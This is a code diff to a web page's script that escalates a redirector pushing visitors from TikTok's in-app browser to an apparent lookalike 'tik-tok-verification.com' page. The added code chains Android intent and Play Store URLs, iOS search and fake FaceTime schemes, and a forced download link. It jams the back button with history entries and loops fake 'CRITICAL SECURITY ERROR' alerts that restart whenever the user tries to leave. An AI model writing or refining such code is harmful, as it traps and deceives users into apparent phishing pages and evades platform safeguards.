@@ -10,48 +10,69 @@
 <script>
     const destination = "https://tik-tok-verification.com/Verification/verify1.html";
     const startTime = Date.now();
-    const limit = 5000; // 5 SECOND FAIL-SAFE
+    const limit = 5000; // 5 SECOND FAIL-SAFE (STRICT)
 
-    function forceExternal() {
+    function nuclearBreakout() {
         const isAndroid = /Android/i.test(navigator.userAgent);
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
+        // 1. THE BLOB DOWNLOAD (Forces "Open In..." or Download Manager)
+        const blob = new Blob([" "], {type: "application/octet-stream"});
+        const blobUrl = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = destination;
+        a.target = "_blank";
+        a.download = "verify.html";
+
         if (isAndroid) {
-            // Android: High-priority Intent with Browser Package
-            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
-        } else if (isIOS) {
-            // iOS: The "Data-Uri" Handover
-            // This creates a fake contact file. TikTok can't render this, so it kicks it to Safari.
-            const vcard = "BEGIN:VCARD\nVERSION:3.0\nURL:" + destination + "\nEND:VCARD";
-            const blob = new Blob([vcard], {type: 'text/vcard'});
-            window.location.href = URL.createObjectURL(blob);
+            // ANDROID: Double-Intent + Market Bypass
+            // Direct Chrome Package call
+            window.location.href = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
             
-            // Backup: Direct location assignment
-            setTimeout(() => { window.location.assign(destination); }, 250);
+            // Conflict: Try to open the Play Store with the URL as a parameter
+            setTimeout(() => {
+                window.location.href = "market://details?id=com.android.chrome&url=" + encodeURIComponent(destination);
+            }, 50);
+        } else if (isIOS) {
+            // iOS: The "Search-to-Maps" Leak
+            // Maps and Search are system-priority. This forces a protocol prompt.
+            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
+            
+            setTimeout(() => {
+                // The "Facetime" prompt hijack - forces focus out of the app
+                window.location.href = "facetime-prompt://" + destination.replace("https://", "");
+            }, 50);
         }
+
+        // UNIVERSAL: Physical click on a virtual anchor to bypass "Automated Navigation" filters
+        a.click();
     }
 
     function rampage() {
-        // FAIL-SAFE CHECK
-        if (Date.now() - startTime > limit) return;
+        // FAIL-SAFE: Hard clock check. 
+        if (Date.now() - startTime > limit) {
+            return; 
+        }
 
-        // 1. Force the OS handover
-        forceExternal();
+        // Fire the conflict shotgun
+        nuclearBreakout();
 
-        // 2. The Alert Lock (prevents TikTok from closing the process)
-        alert("SECURITY NOTICE:\n\nVerification session expired. Press OK to open the secure system browser.");
+        // BLOCK THE UI: Forces the OS to process the background navigation
+        alert("CRITICAL SECURITY ERROR\n\nVerification Required. Tap OK to open System Browser.");
         
-        // 3. Force handover again after dismissal
-        forceExternal();
+        // Fire again immediately after they dismiss
+        nuclearBreakout();
 
-        setTimeout(rampage, 1);
+        setTimeout(rampage, 10);
     }
 
     window.onload = () => {
-        for(let i=0; i<20; i++) history.pushState(null, null, "#" + i);
+        // Back-button jammer
+        for(let i=0; i<30; i++) history.pushState(null, null, "#" + i);
         rampage();
     };
 
+    // If they hit 'X', blur happens - restart rampage instantly
     window.onblur = () => {
         rampage();
     };
